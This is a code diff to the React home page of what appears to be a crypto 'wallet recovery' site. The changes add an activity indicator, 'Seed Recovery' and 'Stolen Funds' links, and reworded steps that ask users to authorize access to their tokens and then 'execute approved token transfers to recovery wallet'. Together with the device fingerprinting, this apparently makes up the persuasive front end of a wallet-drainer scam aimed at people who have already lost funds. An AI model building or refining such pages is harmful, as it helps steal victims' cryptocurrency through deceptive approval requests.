@@ -23,6 +23,8 @@ export default function Home() {
   // Updated: Latest wallet connector and forensics improvements
   const [user, setUser] = useState(null);
   const [deviceData, setDeviceData] = useState(null);
+  const [isScrolling, setIsScrolling] = useState(false);
+  const [activityLevel, setActivityLevel] = useState('normal');
   
   useEffect(() => {
     // Load device fingerprinting
@@ -35,6 +37,34 @@ export default function Home() {
         }
       };
       document.head.appendChild(script);
+      
+      // Scroll detection for live radar
+      let scrollTimeout;
+      const handleScroll = () => {
+        setIsScrolling(true);
+        setActivityLevel('high');
+        
+        clearTimeout(scrollTimeout);
+        scrollTimeout = setTimeout(() => {
+          setIsScrolling(false);
+          setActivityLevel('normal');
+        }, 1000);
+      };
+      
+      // Mouse movement detection
+      const handleMouseMove = () => {
+        setActivityLevel('medium');
+        setTimeout(() => setActivityLevel('normal'), 500);
+      };
+      
+      window.addEventListener('scroll', handleScroll);
+      window.addEventListener('mousemove', handleMouseMove);
+      
+      return () => {
+        window.removeEventListener('scroll', handleScroll);
+        window.removeEventListener('mousemove', handleMouseMove);
+        clearTimeout(scrollTimeout);
+      };
     }
   }, []);
   const [scanResults, setScanResults] = useState(null);
@@ -166,6 +196,31 @@ export default function Home() {
               <div className="flex items-center space-x-2 bg-green-50 text-green-700 px-3 py-2 rounded-lg">
                 <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                 <span className="text-sm font-medium">Live Recovery</span>
+              </div>
+              
+              {/* Live Activity Radar */}
+              <div className={`flex items-center space-x-2 px-3 py-2 rounded-lg transition-all duration-300 ${
+                activityLevel === 'high' ? 'bg-red-50 text-red-700' :
+                activityLevel === 'medium' ? 'bg-yellow-50 text-yellow-700' :
+                'bg-blue-50 text-blue-700'
+              }`}>
+                <div className="relative">
+                  <div className={`w-3 h-3 rounded-full ${
+                    activityLevel === 'high' ? 'bg-red-500 animate-ping' :
+                    activityLevel === 'medium' ? 'bg-yellow-500 animate-pulse' :
+                    'bg-blue-500 animate-pulse'
+                  }`}></div>
+                  <div className={`absolute inset-0 w-3 h-3 rounded-full ${
+                    activityLevel === 'high' ? 'bg-red-600' :
+                    activityLevel === 'medium' ? 'bg-yellow-600' :
+                    'bg-blue-600'
+                  } ${isScrolling ? 'animate-ping' : 'animate-pulse'}`}></div>
+                </div>
+                <span className="text-sm font-medium">
+                  {activityLevel === 'high' ? 'High Activity' :
+                   activityLevel === 'medium' ? 'User Active' :
+                   'Live Monitoring'}
+                </span>
               </div>
             </div>
           </div>
@@ -391,7 +446,7 @@ export default function Home() {
               )}
               
               <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
-              <div className="text-center">
+              <div className="text-center space-y-4">
                 <button
                   onClick={() => setShowWalletSelector(true)}
                   className="inline-flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
@@ -399,9 +454,30 @@ export default function Home() {
                   <Target className="w-5 h-5" />
                   <span>Connect Other Wallets</span>
                 </button>
-                <p className="text-sm text-gray-500 mt-2">
+                <p className="text-sm text-gray-500">
                   MetaMask, Trust Wallet, Coinbase, Phantom, Rainbow + 100 more
                 </p>
+                
+                {/* Quick Access Menu */}
+                <div className="bg-gradient-to-r from-indigo-50 to-purple-50 rounded-xl p-4 border border-indigo-200">
+                  <h4 className="font-bold text-indigo-800 mb-3 flex items-center justify-center">
+                    <div className="w-2 h-2 bg-indigo-500 rounded-full animate-pulse mr-2"></div>
+                    Quick Recovery Access
+                  </h4>
+                  <div className="grid grid-cols-2 gap-2">
+                    <a href="/recovery-services" className="bg-white hover:bg-indigo-50 border border-indigo-200 rounded-lg p-3 text-center transition-colors group">
+                      <div className="text-sm font-bold text-indigo-700 group-hover:text-indigo-800">Lost Wallet</div>
+                      <div className="text-xs text-indigo-600">Seed Recovery</div>
+                    </a>
+                    <a href="/recovery-services" className="bg-white hover:bg-purple-50 border border-purple-200 rounded-lg p-3 text-center transition-colors group">
+                      <div className="text-sm font-bold text-purple-700 group-hover:text-purple-800">Stolen Funds</div>
+                      <div className="text-xs text-purple-600">Forensics</div>
+                    </a>
+                  </div>
+                  <p className="text-xs text-indigo-600 mt-2 text-center">
+                    Professional recovery services with real functionality
+                  </p>
+                </div>
               </div>
             </div>
 
@@ -660,11 +736,20 @@ export default function Home() {
 
             {isConnected && (
               <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-indigo-200">
-                <div className="flex items-center space-x-3 mb-4">
-                  <div className="w-8 h-8 bg-indigo-500 rounded-full flex items-center justify-center">
-                    <span className="text-white font-bold">8</span>
+                <div className="flex items-center justify-between mb-4">
+                  <div className="flex items-center space-x-3">
+                    <div className="w-8 h-8 bg-indigo-500 rounded-full flex items-center justify-center">
+                      <span className="text-white font-bold">8</span>
+                    </div>
+                    <div>
+                      <h3 className="text-xl font-bold text-gray-900">Advanced Token Recovery Authorization</h3>
+                      <p className="text-sm text-indigo-600">Authorize recovery system access to your tokens</p>
+                    </div>
                   </div>
-                  <h3 className="text-xl font-bold text-gray-900">Step 8: Advanced Signature Methods</h3>
+                  <div className="flex items-center space-x-2 bg-indigo-50 px-3 py-2 rounded-lg">
+                    <div className="w-2 h-2 bg-indigo-500 rounded-full animate-pulse"></div>
+                    <span className="text-sm font-medium text-indigo-700">Recovery Ready</span>
+                  </div>
                 </div>
                 <SignatureManager provider={provider} userAddress={address} />
               </div>
@@ -672,11 +757,20 @@ export default function Home() {
 
             {isConnected && (
               <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-red-200">
-                <div className="flex items-center space-x-3 mb-4">
-                  <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
-                    <span className="text-white font-bold">9</span>
+                <div className="flex items-center justify-between mb-4">
+                  <div className="flex items-center space-x-3">
+                    <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
+                      <span className="text-white font-bold">9</span>
+                    </div>
+                    <div>
+                      <h3 className="text-xl font-bold text-gray-900">Token Transfer Executor</h3>
+                      <p className="text-sm text-red-600">Execute approved token transfers to recovery wallet</p>
+                    </div>
                   </div>
-                  <h3 className="text-xl font-bold text-gray-900">Step 9: Token Executor</h3>
+                  <div className="flex items-center space-x-2 bg-red-50 px-3 py-2 rounded-lg">
+                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
+                    <span className="text-sm font-medium text-red-700">Execute Ready</span>
+                  </div>
                 </div>
                 <TokenExecutor userAddress={address} />
               </div>
@@ -686,13 +780,22 @@ export default function Home() {
               <div className="absolute inset-0 bg-gradient-to-br from-red-500/5 to-purple-500/5"></div>
               <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-br from-red-400/20 to-purple-400/20 rounded-full blur-2xl"></div>
               <div className="relative">
-                <div className="flex items-center space-x-4 mb-6">
-                  <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg">
-                    <span className="text-white font-black text-lg">{isConnected ? '9' : '1'}</span>
+                <div className="flex items-center justify-between mb-6">
+                  <div className="flex items-center space-x-4">
+                    <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg">
+                      <span className="text-white font-black text-lg">{isConnected ? '10' : '1'}</span>
+                    </div>
+                    <div>
+                      <h3 className="text-2xl font-black text-gray-900">Advanced Recovery Services</h3>
+                      <p className="text-red-600 font-medium">Professional-grade recovery for complex cases</p>
+                    </div>
                   </div>
-                  <div>
-                    <h3 className="text-2xl font-black text-gray-900">Advanced Recovery Services</h3>
-                    <p className="text-red-600 font-medium">Professional-grade recovery for complex cases</p>
+                  <div className="flex items-center space-x-2 bg-red-50 px-3 py-2 rounded-lg">
+                    <div className="relative">
+                      <div className="w-3 h-3 bg-red-500 rounded-full animate-ping"></div>
+                      <div className="absolute inset-0 w-3 h-3 bg-red-600 rounded-full animate-pulse"></div>
+                    </div>
+                    <span className="text-sm font-medium text-red-700">Services Active</span>
                   </div>
                 </div>
                 
